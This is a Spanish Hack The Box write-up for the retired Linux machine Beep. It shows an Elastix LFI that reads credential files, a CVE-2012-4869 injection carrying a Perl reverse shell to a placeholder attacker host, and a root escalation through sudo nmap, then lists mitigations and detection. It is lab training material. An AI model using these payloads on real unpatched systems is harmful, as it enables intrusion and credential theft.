---
machine: Beep
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, elastix, freepbx, lfi, cve, sudo]
---

# Beep — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Centralita Elastix con FreePBX, Webmin y un montón de servicios de correo. Un LFI en `vtigercrm/graph.php` lee `/etc/amportal.conf` y entrega las contraseñas de la base, del panel y de Asterisk. Con una extensión válida se explota CVE-2012-4869 en `callme_page.php` para ejecutar comandos como `asterisk`. La escalada es un `sudo nmap` que se resuelve con el modo interactivo.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp    ssh     OpenSSH 4.3
25/tcp    smtp
80/tcp    http    Apache 2.2.3 (CentOS) → redirect a 443
110/tcp   pop3
111/tcp   rpcbind
143/tcp   imap
443/tcp   ssl/http Apache 2.2.3
993/tcp   imaps
995/tcp   pop3s
3306/tcp  mysql
4445/tcp  unknown
10000/tcp http    Webmin 1.570 (MiniServ)
```

El conjunto (correo + panel + MySQL + Webmin) es la firma de Elastix. El servidor solo habla SSLv3/TLS 1.0, así que las herramientas modernas fallan por defecto.

## Enumeración

```bash
curl -k -I https://<IP>/
curl -k -s https://<IP>/ | grep -i elastix
```

```bash
searchsploit elastix
searchsploit -x php/webapps/37637.pl
```

El LFI de `vtigercrm` permite leer ficheros sin autenticar:

```bash
curl -k --path-as-is \
  "https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action"
```

```text
AMPDBPASS=<dbpass>
AMPMGRPASS=<mgrpass>
ARI_ADMIN_USERNAME=admin
ARI_ADMIN_PASSWORD=<panelpass>
```

Con esas credenciales se entra al panel (`https://<IP>/`) y se listan las extensiones; hace falta una válida para el exploit siguiente (por ejemplo `233`).

## Foothold

CVE-2012-4869: `recordings/misc/callme_page.php` construye una llamada de Asterisk con parámetros sin sanear, así que se puede inyectar una aplicación del dialplan (`System`) y ejecutar un comando.

```bash
nc -lvnp 4445
```

```bash
curl -k --tls-max 1.0 --ciphers 'AES128-SHA' -1 \
  "https://<IP>/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20'%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22<ATTACKER>%3a4445%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b'%0D%0A%0D%0A"
```

La conexión llega como `asterisk`. Para estabilizar:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

Si el cliente rechaza el certificado o el protocolo, se puede bajar la seguridad global de OpenSSL en el atacante (`MinProtocol = None`, `CipherString = DEFAULT@SECLEVEL=0`) y revertirlo al terminar.

## Escalada

```bash
sudo -l
```

```text
User asterisk may run the following commands on beep:
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    ...
```

`nmap` conserva el modo interactivo en esta versión, que permite lanzar una shell:

```bash
sudo nmap --interactive
nmap> !sh
# id → uid=0(root)
```

## Evidencia

- `id` como `asterisk` y después como `root`.
- `/etc/amportal.conf` con contraseñas redactadas.
- Lectura de `user.txt` en `/home/fanis` y de `root.txt` (redactados).

## Lecciones aprendidas

- Los appliances (Elastix, FreePBX) acumulan paneles y servicios antiguos: `searchsploit` sobre el producto rinde más que buscar CVE por servicio.
- Un LFI que lee configuración convierte un fallo de lectura en credenciales de varios sistemas.
- TLS 1.0 obliga a ajustar el cliente; conviene saber hacerlo sin romper el resto del laboratorio.
- El modo interactivo de `nmap` es root instantáneo cuando está en sudoers (GTFOBins).
- Las extensiones del panel son datos de entrada del exploit: hay que enumerarlas antes de disparar.

## Mitigaciones y detección

- Actualizar Elastix/FreePBX y retirar `vtigercrm` si no se usa; el LFI es de 2012 y sigue en instalaciones sin parchear.
- Restringir `recordings/misc/callme_page.php` y validar `callmenum` contra el listado real de extensiones.
- Sacar `nmap`, `yum` y compañía de sudoers; si se necesitan, con argumentos fijos.
- Deshabilitar TLS 1.0/1.1 y SSLv3 en el servidor.
- Detección: peticiones a `graph.php?current_language=` con `../`, llamadas salientes desde Asterisk, procesos `nmap` con `--interactive`.
- MITRE: T1005 (datos locales), T1190, T1548.003.

## Referencias

- CVE-2012-4869 (FreePBX `callme_page.php`).
- GTFOBins: `nmap`.
- MITRE ATT&CK: T1190, T1548.003.
